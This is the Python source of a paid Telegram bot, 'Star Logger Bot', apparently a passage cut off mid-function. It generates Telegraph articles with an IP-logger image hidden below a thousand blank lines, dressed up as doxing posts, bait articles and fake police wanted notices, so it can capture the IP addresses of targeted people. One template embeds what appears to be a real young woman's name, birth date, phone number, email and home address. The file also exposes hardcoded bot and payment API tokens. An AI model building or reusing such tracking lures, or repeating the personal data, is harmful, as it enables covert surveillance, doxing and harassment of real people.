import telebot
from telebot import types
import sqlite3
from datetime import datetime, timedelta
import requests
import certifi
from decimal import Decimal
import random
import string
import time
import threading
import psutil
from telegraph import Telegraph
import requests

Crypto_Pay_API_Token = "161663:AAhep5VUTvoRH7NTohrb1YFO41vQQkzT06e"
bot = telebot.TeleBot('9043148910:AAF_ewMZkG7fuIGF-xWfXdIVHeuQ0V-duM0', parse_mode='HTML')
admin_ids = [8297446667]
log_chat_id = -3736442705

def create_database():
    conn = sqlite3.connect('database2.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            user_id INTEGER UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS subscriptions (
            user_id INTEGER PRIMARY KEY,
            expiration_date DATETIME
        )
    ''')
    conn.commit()
    conn.close()

create_database()

def check_user(user_id):
    conn = sqlite3.connect('database2.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    existing_user = cursor.fetchone()
    if existing_user:
        conn.close()
        return True
    else:
        cursor.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
        return False

@bot.message_handler(commands=['start'])
def home(message):
    user_id = message.chat.id
    username = message.chat.username
    
    conn = sqlite3.connect('database2.db')
    cursor = conn.cursor()
    
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()
    
    if user is None:
        cursor.execute("INSERT INTO users (user_id, username, created_at) VALUES (?, ?, ?)",
                       (user_id, username, datetime.now()))
        conn.commit()
        bot.send_message(user_id, "Добро пожаловать! Вы зарегистрированы.")
    else:
        bot.send_message(user_id, "Вы уже зарегистрированы.")
    
    conn.close()

if __name__ == '__main__':
    bot.polling(none_stop=True)

def start_cmd(message):
  register = check_user(message.chat.id)
  if not register:
    markup = types.InlineKeyboardMarkup()
    continue_button = types.InlineKeyboardButton("✅ Продолжить",
                                                 callback_data='continue')
    markup.add(continue_button)
    with open('had2.jpg', 'rb') as had:
      bot.send_photo(message.chat.id,
                     had,
                     '<b>💎Приветствуем вас в Crystal Snos Bot!',
                     parse_mode='HTML',
                     reply_markup=markup)

def check_subscription_status(user_id):
  conn = sqlite3.connect('database2.db')
  cursor = conn.cursor()

  cursor.execute("SELECT expiration_date FROM subscriptions WHERE user_id=?",
                 (user_id, ))
  subscription = cursor.fetchone()

  if subscription:
    expiration_date = subscription[0]
    date = datetime.strptime(expiration_date, '%Y-%m-%d %H:%M:%S.%f')
    current_date = datetime.now()

    if current_date <= date:
      days_left = (date - current_date).days
      status = f"<b>⭐️Star Logger Bot\n=============================\n📙У вас имеется активная подписка\n📙У вас осталось {days_left} дней подписки\n=============================\n🆔Ваш ID: {user_id}\n=============================\n⚙️Support: @StarLoggerSupportbot \n⭐️Наш канал: @StarLogger\n⭐️Приятного пользования ботом</b>"
    else:
      status = f"<b>⭐️Star Logger Bot\n=============================\n📙У вас истекла подписка.\n=============================\n🆔 ID: {user_id}\n=============================\n⚙️Support: @StarLoggerSupportbot \n⭐️Наш канал: @StarLogger\n⭐️Приятного пользования ботом</b>"
  else:
    status = f"<b>⭐️Star Logger Bot\n=============================\n📙У вас истекла отсутствует подписка.\n=============================\n🆔 ID: {user_id}\n=============================\n⚙️Support: @StarLoggerSupportbot \n⭐️Наш канал: @StarLogger\n⭐️Приятного пользования ботом</b>"

  conn.close()
  return status

def check_subscription(user_id):
  conn = sqlite3.connect('database2.db')
  cursor = conn.cursor()

  cursor.execute("SELECT expiration_date FROM subscriptions WHERE user_id=?",
                 (user_id, ))
  subscription = cursor.fetchone()
  conn.close()

  if subscription:
    expiration_date = subscription[0]
    date = datetime.strptime(expiration_date, '%Y-%m-%d %H:%M:%S.%f')
    current_date = datetime.now()

    if current_date <= date:
      return True
    else:
      return False
  else:
    return False

def check_user(user_id):
  conn = sqlite3.connect('database2.db')
  cursor = conn.cursor()

  cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id, ))
  existing_user = cursor.fetchone()

  if existing_user:
    return True
  else:
    cursor.execute("INSERT INTO users (user_id) VALUES (?)", (user_id, ))
    conn.commit()
    send_log(
        f'<b>⭐️ Зарегистрирован новый <a href="tg://openmessage?user_id={user_id}">пользователь</a>\bID: </b><code>{user_id}</code>'
    )
    return False

  conn.close()

@bot.message_handler(commands=['info'])
def get_user_info(message):
    conn = sqlite3.connect('database2.db')
    cursor = conn.cursor()

    user_id = message.text.split(' ')[1]  # Получаем идентификатор пользователя из сообщения

    # Запрос к базе данных для получения информации о пользователе
    cursor.execute('''
        SELECT users.user_id, subscriptions.expiration_date
        FROM users
        LEFT JOIN subscriptions ON users.user_id = subscriptions.user_id
        WHERE users.user_id = ?
    ''', (user_id,))
    
    user_info = cursor.fetchone()  # Получение одной строки результата запроса

    if user_info:
        user_id, expiration_date = user_info
        bot.reply_to(message, f"🆔пользователя: {user_id}\n⏳Кол-во дней подписки: {expiration_date}")
    else:
        bot.reply_to(message, "❌Пользователь с таким идентификатором не найден.")

    conn.close()

def send_message_to_users(text):
    # Подключение к базе данных
    conn = sqlite3.connect('database2.db')
    cursor = conn.cursor()
    # Получение всех user_id из базы данных
    cursor.execute('SELECT user_id FROM users')
    rows = cursor.fetchall()
    # Рассылка сообщений каждому user_id
    for row in rows:
        user_id = row[0]
        try:
            bot.send_message(user_id, text)
        except telebot.apihelper.ApiTelegramException as e:
            if e.result_json['error_code'] == 403:
                print(f'Пользователь с айди {user_id} заблокировал бота. Сообщение не отправлено.')
    # Закрытие соединения с базой данных
    conn.close()

def send_message2(call, message):
    sent_message = bot.reply_to(message, "⭐️Введите сообщение для отправки пользователям:")
    bot.register_next_step_handler(sent_message, process_sent_message)

def process_sent_message(message):
    text = message.text
    send_message_to_users(text)
    bot.reply_to(message, '⭐️Сообщение отправлено пользователям.')

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    if message.chat.id in admin_ids:
        markup = types.InlineKeyboardMarkup(row_width=1)
        send_sub = types.InlineKeyboardButton("⭐️Выдать подписку", callback_data='send_sub')
        send_message = types.InlineKeyboardButton("⭐️Сделать рассылку", callback_data='send_message2')
        usercounts = types.InlineKeyboardButton("⭐️Статистика", callback_data='usercounts')
        send_database = types.InlineKeyboardButton("⭐️Отправить базу данных", callback_data='send_database')
        edit_sub = types.InlineKeyboardButton("⭐️Продлить сабам", callback_data='edit_sub')
        edit_whitelist = types.InlineKeyboardButton("⭐️Внести в белый лист", callback_data='whitelist_edit')
        markup.add(send_sub, send_message, usercounts, send_database, edit_sub, edit_whitelist)  # Добавляем кнопку в разметку
        with open('had2.jpg', 'rb') as had:
            bot.send_photo(chat_id=message.chat.id, photo=had, caption='<b>⭐️Админ-меню: </b>', reply_markup=markup)
    else:
        with open('had2.jpg', 'rb') as had:
            bot.send_photo(chat_id=message.chat.id, photo=had, caption='<b>❌ Я не понимаю вас.</b>')

@bot.message_handler(commands=['start'])
def home(message):
    start_cmd(message)

    user_id = message.from_user.id


    channel_id1 = -1002133502681
    channel_id2 = -1002124901827

    user_status1 = bot.get_chat_member(channel_id1, user_id).status
    user_status2 = bot.get_chat_member(channel_id2, user_id).status

    if (user_status1 in ["member", "administrator", "creator"]) and (user_status2 in ["member", "administrator", "creator"]):
        if check_subscription(message.chat.id) == True:
            markup = types.InlineKeyboardMarkup(row_width=2)
            chanell = types.InlineKeyboardButton("⭐️Наш канал", url='https://t.me/+FfSgUJx-g4s0ZTE6')
            cabinet = types.InlineKeyboardButton("📙Профиль", callback_data='cabinet')
            logger_key = types.InlineKeyboardButton("🌟Создать логгер", callback_data='logger')
            soglas = types.InlineKeyboardButton("📙Мануалы", url='https://t.me/c/2133502681/33')
            markup.add(chanell, soglas, cabinet, logger_key)
            with open('had2.jpg', 'rb') as had:
                bot.send_photo(chat_id=message.chat.id, photo=had, caption='<b>⭐️Star Logger Bot!\n=============================\n⭐️Вы находитесь в главном меню бота\n⭐️Ниже предоставлены кнопки для управления ботом\n=============================\n⭐️Наш бот никак не нарушает законы,а так же не собирает информация о пользователях без их соглашения\n⭐️Наш тг канал @StarLogger</b>', reply_markup=markup)
        else:
            markup = types.InlineKeyboardMarkup()
            cabinet = types.InlineKeyboardButton("📙Профиль", callback_data='cabinet')
            chanell = types.InlineKeyboardButton("⭐️Наш канал", url='https://t.me/+FfSgUJx-g4s0ZTE6')
            my_sub = types.InlineKeyboardButton("💸Подписка", callback_data='my_sub')
            soglas = types.InlineKeyboardButton("📙Мануалы", url='https://t.me/c/2133502681/33')
            markup.add(chanell, soglas, cabinet, my_sub)
            with open('had2.jpg', 'rb') as had:
                bot.send_photo(chat_id=message.chat.id, photo=had, caption='<b>⭐️Star Logger Bot!\n=============================\n⭐️Вы находитесь в главном меню бота\n⭐️Ниже предоставлены кнопки для управления ботом\n=============================\n⭐️Наш бот никак не нарушает законы,а так же не собирает информация о пользователях без их соглашения\n⭐️Наш тг канал @StarLogger</b>', reply_markup=markup)
    else:
        url = types.InlineKeyboardMarkup(row_width=3)
        url_b = types.InlineKeyboardButton("⭐️StarLogger", url=f"https://t.me/+FfSgUJx-g4s0ZTE6")
        url_c = types.InlineKeyboardButton("💎CrystalSnos", url=f"https://t.me/+DlLX5rOPmqphNDEy")
        url.add(url_b, url_c)

        bot.send_message(message.chat.id, "<b>⭐️Приветствую тебя в боте StarLogger\n⭐️Для того чтобы воспользоваться нашим ботом тебе придется подпсаться на наши каналы,так же подписавшись на канал ты подтверждаешь пользовательское соглашение.\n⭐️После подписки на все каналы повторите команду!</b>", reply_markup=url, parse_mode='html')

@bot.callback_query_handler(func=lambda call: call.data == 'cabinet')
def cabinet(call):
    user_id = call.message.chat.id
    status = check_subscription_status(user_id)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("💰Приобрести подписку", callback_data="buy_subscription"))
    markup.add(types.InlineKeyboardButton("⚙️Support", url='https://t.me/StarLoggerSupportbot'))
    markup.add(types.InlineKeyboardButton("❌Назад", callback_data="back"))
    bot.edit_message_caption(chat_id=user_id, message_id=call.message.message_id, caption=status, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == 'buy_subscription')
def buy_subscription(call):
    markup = types.InlineKeyboardMarkup()
    subscription_options = [
        ("⭐️7 дней - 0.7$", "buy_7"),
        ("⭐️15 дней - 1.5$", "buy_15"),
        ("⭐️1 месяц - 3$", "buy_30"),
        ("⭐️2 месяца - 6$", "buy_60"),
        ("⭐️3 месяца - 9$", "buy_90"),
        ("⭐️Lifetime - 15$", "buy_lifetime")
    ]
    for option_text, callback_data in subscription_options:
        markup.add(types.InlineKeyboardButton(option_text, callback_data=callback_data))
    bot.edit_message_caption("<b>⌛️Выберите срок подписки:</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='html', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('buy_'))
def subscription_duration_selected(call):
    duration = call.data
    markup = types.InlineKeyboardMarkup()
    currency_options = [
        ("💵 USDT", "currency_USDT_" + duration),
        ("💎 TON", "currency_TON_" + duration),
        ("🪙 BTC", "currency_BTC_" + duration),
        ("💶 ETH", "currency_ETH_" + duration)
    ]
    for option_text, callback_data in currency_options:
        markup.add(types.InlineKeyboardButton(option_text, callback_data=callback_data))
    bot.edit_message_caption("<b>💸Выберите валюту для оплаты:</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='html', reply_markup=markup)

def generate_payment_link(payment_system, amount):
    api_url = "https://pay.crypt.bot/api/createInvoice"
    headers = {"Crypto-Pay-API-Token": Crypto_Pay_API_Token}
    data = {
        "asset": payment_system,
        "amount": float(amount)
    }

    response = requests.post(api_url, headers=headers, json=data)
    if response.status_code == 200:
        json_data = response.json()
        invoice = json_data.get("result")
        payment_link = invoice.get("pay_url")
        invoice_id = invoice.get("invoice_id")
        return payment_link, invoice_id
    else:
        return None, None

def get_invoice_status(invoice_id):
    api_url = f"https://pay.crypt.bot/api/getInvoices?invoice_ids={invoice_id}"
    headers = {"Crypto-Pay-API-Token": Crypto_Pay_API_Token}

    response = requests.get(api_url, headers=headers)
    if response.status_code == 200:
        json_data = response.json()
        if json_data.get("ok"):
            invoices = json_data.get("result")
            if invoices and 'items' in invoices and invoices['items']:
                status = invoices['items'][0]['status']
                payment_link = invoices['items'][0]['pay_url']
                amount = Decimal(invoices['items'][0]['amount'])
                return status, payment_link, amount

    return None, None, None

def get_exchange_rates():
    api_url = "https://pay.crypt.bot/api/getExchangeRates"
    headers = {"Crypto-Pay-API-Token": Crypto_Pay_API_Token}

    response = requests.get(api_url, headers=headers)
    if response.status_code == 200:
        json_data = response.json()
        if json_data.get("ok"):
            return json_data["result"]
    return []

def convert_to_crypto(amount, asset):
    rates = get_exchange_rates()
    rate = None
    for exchange_rate in rates:
        if exchange_rate["source"] == asset and exchange_rate["target"] == 'USD':
            rate = Decimal(str(exchange_rate["rate"]))
            break

    if rate is None:
        raise ValueError(f"⭐️Не удалось найти курс обмена для {asset}")

    amount = Decimal(str(amount))
    return amount / rate

del_markup = types.InlineKeyboardMarkup(row_width=2)
del_button = types.InlineKeyboardButton("❌Назад", callback_data="del")
del_markup.add(del_button)

back_markup = types.InlineKeyboardMarkup(row_width=2)
back_button = types.InlineKeyboardButton("❌Назад", callback_data="back")
back_markup.add(back_button)

@bot.callback_query_handler(func=lambda call: call.data.startswith('currency_'))
def currency_selected(call):
    parts = call.data.split('_')
    currency = parts[1]
    duration_parts = parts[2:]
    duration = "_".join(duration_parts)

    amount = get_amount_by_duration(duration.replace('buy_', ''))
    
    try:
        print(amount, currency)
        converted_amount = convert_to_crypto(amount, currency)
        payment_link, invoice_id = generate_payment_link(currency, converted_amount)
        if payment_link and invoice_id:
            markup = types.InlineKeyboardMarkup(row_width=1)
            check_payment_button = types.InlineKeyboardButton("💸Проверить оплату", callback_data=f"check_payment:{call.from_user.id}:{invoice_id}")
            oplata_link = types.InlineKeyboardButton("💸Счет для оплаты", url=f"{payment_link}")
            markup.add(check_payment_button, oplata_link)
            
            bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, 
                                  caption=f"<b>💸Ваш ваша заявка для оплаты подписки в нашем боте:</b>", reply_markup=markup, parse_mode='html')
        else:
            bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, 
                                  caption="❌Не удалось создать счет для оплаты. Пожалуйста, попробуйте позже.")
    except ValueError as e:
        bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, 
                              caption=str(e))

def get_amount_by_duration(duration):
    prices = {
        '7': 0.7,
        '15': 1.5,
        '30': 3,
        '60': 6,
        '90': 9,
        'lifetime': 15
    }
    return prices.get(duration, 0)

@bot.callback_query_handler(func=lambda call: call.data.startswith('check_payment:'))
def check_payment(call):
    _, user_id_str, invoice_id_str = call.data.split(':')
    user_id = int(user_id_str)
    invoice_id = invoice_id_str

    if user_id == call.from_user.id:
        status, payment_link, amount = get_invoice_status(invoice_id)
        
        if status == "paid":
            duration_days = get_duration_by_amount(amount)
            days_to_add = duration_days
            expiration_date = datetime.now() + timedelta(days=days_to_add)
            add_subscription(user_id, expiration_date, days_to_add)

            bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, 
                                  caption="✅Оплата подтверждена. Подписка активирована. Спасибо за покупку.")
        else:
            bot.answer_callback_query(call.id, "❌Оплата не найдена. Пожалуйста, проверьте позже или свяжитесь с поддержкой.")
    else:
        bot.answer_callback_query(call.id, "❌Вы не можете проверить эту оплату.", show_alert=True)

@bot.message_handler(commands=['info'])
def get_user_info(message):
    conn = sqlite3.connect('database2.db')
    cursor = conn.cursor()

    user_id = message.text.split(' ')[1]  # Получаем идентификатор пользователя из сообщения

    # Запрос к базе данных для получения информации о пользователе
    cursor.execute('''
        SELECT users.user_id, subscriptions.expiration_date
        FROM users
        LEFT JOIN subscriptions ON users.user_id = subscriptions.user_id
        WHERE users.user_id = ?
    ''', (user_id,))
    
    user_info = cursor.fetchone()  # Получение одной строки результата запроса

    if user_info:
        user_id, expiration_date = user_info
        bot.reply_to(message, f"🆔пользователя: {user_id}\n⏳Кол-во дней подписки: {expiration_date}")
    else:
        bot.reply_to(message, "❌Пользователь с таким идентификатором не найден.")

    conn.close()

def get_duration_by_amount(amount):
    amount = round(amount, 2)
    if amount <= 1:
        return 7
    elif amount <= 2:
        return 15
    elif amount <= 3:
        return 30
    elif amount <= 6:
        return 60
    elif amount <= 9:
        return 90
    elif amount >= 15:
        return 365 * 99
    else:
        return 0

import requests

@bot.message_handler(commands=['ip'])
def handle_ip_command(message):
    bot.reply_to(message, "<b>⭐️Пожалуйста, введите IP адрес:(формата 1.1.1.1)</b>", parse_mode='HTML')

    @bot.message_handler(func=lambda msg: msg.text, content_types=['text'])
    def handle_ip_address(message):
        ip_address = message.text

        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        data = response.json()

        if data.get('status') == 'fail':
            bot.reply_to(message, "<b>⭐️Ошибка:</b> Неверный IP адрес. Пожалуйста, попробуйте снова.", parse_mode='HTML')
        else:
            ip_info = f"<b>⭐️Данные которые выдает наш бот могут быть не точными!!!</b>\n<b>⭐️IP Address:</b> {data['query']}\n"
            ip_info += f"<b>⭐️Город:</b> {data['city']}\n"
            ip_info += f"<b>⭐️Регион:</b> {data['regionName']}\n"
            ip_info += f"<b>⭐️Страна:</b> {data['country']}\n"
            ip_info += f"<b>⭐️Широта:</b> {data['lat']}\n"
            ip_info += f"<b>⭐️Долгота:</b> {data['lon']}\n"

            location = (data['lat'], data['lon'])

            bot.reply_to(message, ip_info, parse_mode='HTML')
            bot.send_location(message.chat.id, location[0], location[1])

    return handle_ip_address

@bot.callback_query_handler(func=lambda call: True)
def handle_inline_button_click(call):
  user_id = call.message.chat.id
  if call.data == 'send_sub':
    bot.edit_message_caption(
        chat_id=user_id,
        message_id=call.message.id,
        caption='<b>⭐️Укажите ID пользователя и кол-во дней через пробел:</b>')
    bot.register_next_step_handler(call.message, give_sub)
  elif call.data == 'my_sub':
    with open('had2.jpg', 'rb') as had:
      bot.send_photo(user_id,
                     had,
                     check_subscription_status(user_id),
                     reply_markup=del_markup)
  elif call.data == 'del':
    bot.delete_message(call.message.chat.id, call.message.id)
    bot.clear_step_handler_by_chat_id(chat_id=call.message.chat.id)
  elif call.data == 'back':
    home(call.message)
    bot.delete_message(call.message.chat.id, call.message.id)
  elif call.data == 'send_message2':
    sent_message = bot.reply_to(call.message, "⭐️Введите сообщение для отправки пользователям:")
    bot.register_next_step_handler(sent_message, process_sent_message)
  elif call.data == 'usercounts':
    total_users, subscribed_users = get_user_counts()
    bot.reply_to(call.message, f'<b>⭐️Star Logger Bot⭐️\n⭐️Количество пользователей: {total_users}\n⭐️Пользователи с подпиской: {subscribed_users}</b>')
  elif call.data == 'home':
    bot.delete_message(call.message.chat.id, call.message.message_id) 
    home(call.message) 
  elif call.data == 'logger':
    if not check_subscription(call.message.chat.id):
        bot.send_message(call.message.chat.id, "<b>❌В доступе отказано! Купите подписку.</b>", parse_mode='HTML')
        return

    keyboard = types.InlineKeyboardMarkup(row_width=1)
    pysto1 = types.InlineKeyboardButton(text="📙Д0xing", callback_data="pysto21")
    pysto2 = types.InlineKeyboardButton(text="📙Байты", callback_data="pysto22")
    pysto3 = types.InlineKeyboardButton(text="📙Розыски", callback_data="pysto23")
    logger_svou = types.InlineKeyboardButton(text="📙Свой текст", callback_data="logger_svou2")
    back_button = types.InlineKeyboardButton(text="⭐️Главное меню", callback_data="home")
    keyboard.add(pysto1, pysto2, pysto3, logger_svou, back_button)
    with open('had2.jpg', 'rb') as photo:
        bot.send_photo(call.message.chat.id, photo, caption="<b>⭐️Выберите шаблоны для статьи:</b>", parse_mode='HTML', reply_markup=keyboard)
    bot.delete_message(call.message.chat.id, call.message.message_id) 
  elif call.data == "pysto21":
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    doxing_key1 = types.InlineKeyboardButton(text="📙Д0xing байт V1", callback_data="doxingV1")
    doxing_key2 = types.InlineKeyboardButton(text="📙Д0xing байт V2", callback_data="doxingV2")
    doxing_key3 = types.InlineKeyboardButton(text="📙Д0xing байт V3", callback_data="doxingV3")
    doxing_key4 = types.InlineKeyboardButton(text="📙Д0xing байт V4", callback_data="doxingV4")
    back_button = types.InlineKeyboardButton(text="❌Назад", callback_data="logger")
    keyboard.add(doxing_key1, doxing_key2, doxing_key3, doxing_key4, back_button)
    with open('had2.jpg', 'rb') as photo:
        bot.send_photo(call.message.chat.id, photo, caption="<b>⭐️Star Logger Bot⭐️\n⭐️Выберите шаблон Д0xing для создания статьи с IP логгером:</b>", parse_mode='HTML', reply_markup=keyboard)
    bot.delete_message(call.message.chat.id, call.message.message_id) 
  elif call.data == "pysto22":
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    manual_key1 = types.InlineKeyboardButton(text="📙Байт мануал V1", callback_data="manualV1")
    manual_key2 = types.InlineKeyboardButton(text="📙Байт мануал V2", callback_data="manualV2")
    temka_key1 = types.InlineKeyboardButton(text="📙Байт заработок V1", callback_data="temkaV1")
    temka_key2 = types.InlineKeyboardButton(text="📙Байт заработок V2", callback_data="temkaV2")
    back_button = types.InlineKeyboardButton(text="❌Назад", callback_data="logger")
    keyboard.add(manual_key1, manual_key2, temka_key1, temka_key2, back_button)
    with open('had2.jpg', 'rb') as photo:
        bot.send_photo(call.message.chat.id, photo, caption="<b>⭐️Star Logger Bot⭐️\n⭐️Выберите шаблон Байтов для создания статьи с IP логгером:</b>", parse_mode='HTML', reply_markup=keyboard)
    bot.delete_message(call.message.chat.id, call.message.message_id) 
  elif call.data == "pysto23":
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    mvdru_key1 = types.InlineKeyboardButton(text="📙Розыск Мвд.РФ V1", callback_data="mvdruV1")
    mvdru_key2 = types.InlineKeyboardButton(text="📙Розыск Мвд.РФ V2", callback_data="mvdruV2")
    sport_key1 = types.InlineKeyboardButton(text="📙Розыск СпортОтрядом V1", callback_data="sportV1")
    sport_key2 = types.InlineKeyboardButton(text="📙Розыск СпортОтрядом V2", callback_data="sportV2")
    back_button = types.InlineKeyboardButton(text="❌Назад", callback_data="logger")
    keyboard.add(mvdru_key1, mvdru_key2, sport_key1, sport_key2, back_button)
    with open('had2.jpg', 'rb') as photo:
        bot.send_photo(call.message.chat.id, photo, caption="<b>⭐️Star Logger Bot⭐️\n⭐️Выберите шаблон Розысков для создания статьи с IP логгером:</b>", parse_mode='HTML', reply_markup=keyboard)
    bot.delete_message(call.message.chat.id, call.message.message_id) 
  elif call.data == 'logger_svou2':
    create_article1(call.message)
    bot.delete_message(call.message.chat.id, call.message.message_id)
  elif call.data == 'doxingV1':
    create_article2(call.message)
    bot.delete_message(call.message.chat.id, call.message.message_id)
  elif call.data == 'doxingV2':
    create_article3(call.message)
    bot.delete_message(call.message.chat.id, call.message.message_id)
  elif call.data == 'doxingV3':
    create_article4(call.message)
    bot.delete_message(call.message.chat.id, call.message.message_id)
  elif call.data == 'doxingV4':
    create_article5(call.message)
    bot.delete_message(call.message.chat.id, call.message.message_id)
  elif call.data == 'manualV1':
    create_article6(call.message)
    bot.delete_message(call.message.chat.id, call.message.message_id)    
  elif call.data == 'manualV2':
    create_article7(call.message)
    bot.delete_message(call.message.chat.id, call.message.message_id)  
  elif call.data == 'mvdruV1':
    create_article8(call.message)
    bot.delete_message(call.message.chat.id, call.message.message_id) 
  elif call.data == 'mvdruV2':
    create_article9(call.message)
    bot.delete_message(call.message.chat.id, call.message.message_id) 
  elif call.data == 'sportV1':
    create_article10(call.message)
    bot.delete_message(call.message.chat.id, call.message.message_id) 
  elif call.data == 'sportV2':
    create_article11(call.message)
    bot.delete_message(call.message.chat.id, call.message.message_id) 
  elif call.data == 'temkaV1':
    create_article12(call.message)
    bot.delete_message(call.message.chat.id, call.message.message_id)
  elif call.data == 'temkaV2':
    create_article13(call.message)
    bot.delete_message(call.message.chat.id, call.message.message_id)

def get_user_counts():
    # Create a new connection and cursor within the function
    conn = sqlite3.connect('database2.db')
    cursor = conn.cursor()

    # Get total user count
    cursor.execute('SELECT COUNT(*) FROM users')
    total_users = cursor.fetchone()[0]

    # Get subscribed user count
    cursor.execute('SELECT COUNT(*) FROM subscriptions')
    subscribed_users = cursor.fetchone()[0]

    # Close the connection
    conn.close()

    return total_users, subscribed_users

telegraph = Telegraph()
telegraph.create_account(short_name='Star_Logger_Bot')

def create_article1(message):
    # Запрашиваем у пользователя тему статьи
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данная тема статьи которая будет отображаться во время отправки ссылки на статью\n⭐️Введите тему вашей статьи:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, create_article_text1)

def create_article_text1(message):
    title = message.text
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный текст статьи частично будет отображаться во время отправки ссылки на статью\n⭐️Введите текст вашей статьи:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, create_article_photo1, title=title)

def create_article_photo1(message, title):
    text = message.text
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный логгер будет находится в конце статьи для снифинга айпи обидчика\n⭐️Введите ссылку на логгер:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_photo_url1, title=title, text=text)

def process_photo_url1(message, title, text):
    photo_url = message.text
    
    # Создаем страницу на telegraph с изображением фото
    html_content = f"<p>{text}</p><br>" + "<br>"*1000 + f"<img src='{photo_url}'>"
    page = telegraph.create_page(title=title, html_content=html_content)
    
    # Получаем URL созданной статьи
    page_url = f"https://telegra.ph/{page['path']}"
    
    bot.send_message(message.chat.id, f"<b>⭐️Star Logger Bot⭐️\n⭐️Ваша статья была создана\n=============================\n⭐️Тема: {title}\n⭐️Текст: {text}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}", parse_mode='HTML')
    
    send_log(
        f'<b>🔔 Пользователь {message.chat.id} \n⭐️Star Logger Bot⭐️\n⭐️Шаблон: свой текст\n⭐️Ваша статья была создана\n=============================\n⭐️Тема: {title}\n⭐️Текст: {text}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}'
    )

def create_article2(message):
    # Запрашиваем у пользователя тему статьи
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный ник который будет отображаться во время отправки ссылки на статью а так же в части текста в статье\n⭐️Введите ник вашего обидчика:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, create_article_photo2)

def create_article_photo2(message):
    title = message.text
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный логгер будет находится в конце статьи для снифинга айпи обидчика\n⭐️Введите ссылку на логгер:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_photo_url2, title=title)

def process_photo_url2(message, title):
    photo_url = message.text
    
    # Создаем страницу на telegraph с изображением фото
    html_content = f"<p>Данный человек {title} очень часто пиздел многое и разбрасывался словами за такие действия мы решили собрать его данные в кучу и слить вам, данный человек был сдокшен и слит его данные приложен внизу: <br>" + "<br> Телефон: +79878801951 <br>" + "<br> Страна: Россия <br>" + "<br> Регион: 56 <br>" + "<br> Оператор: MTS <br>" + "<br> Фамилия: Шконда <br>" + "<br> Имя: Софья <br>" + "<br> Отчество: Витальевна <br>" + "<br> Дата рождения: 20.01.2007 <br>" + "<br> Пол: Женский <br>" + "<br> Телефон: +79878801951 <br>" + "<br> Email: sofaskonda54@gmail.com <br>" + "<br> Гражданство: Российская Федерация <br>" + "<br> Адрес: 462100, Оренбургская область,  Саракташский район, п. Саракташ, ул. Первомайская, д. 97 <br>" + "<br> На этом докс окончен. Наш канал - ты попался на логгер1337</p><br>" + "<br>"*1000 + f"<img src='{photo_url}'>"
    page = telegraph.create_page(title=f"Dox HA лu4H0CTb {title}", html_content=html_content)
    
    # Получаем URL созданной статьи
    page_url = f"https://telegra.ph/{page['path']}"
    
    bot.send_message(message.chat.id, f"<b>⭐️Star Logger Bot⭐️\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}", parse_mode='HTML')
    
    send_log(
        f'<b>🔔 Пользователь {message.chat.id} \n⭐️Star Logger Bot⭐️\n⭐️Шаблон: Dox V1\n⭐️Ваша статья была создана\n=============================\n⭐️Ник: {title}\n⭐️Логгер: {photo_url}\n=============================\n⭐️Ссылка на созданную статью:</b>\n {page_url}'
    )

def create_article3(message):
    # Запрашиваем у пользователя тему статьи
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный ник который будет отображаться во время отправки ссылки на статью а так же в части текста в статье\n⭐️Введите ник вашего обидчика:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, create_article_photo3)

def create_article_photo3(message):
    title = message.text
    bot.send_message(message.chat.id, "<b>⭐️Star Logger Bot⭐️\n⭐️Данный логгер будет находится в конце статьи для снифинга айпи обидчика\n⭐️Введите ссылку на логгер:</b>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_photo_url3, title=title)

def process_photo_url3(message, title):
    photo_url = message.text
    
    # Создаем страницу на telegraph с изображением фото 
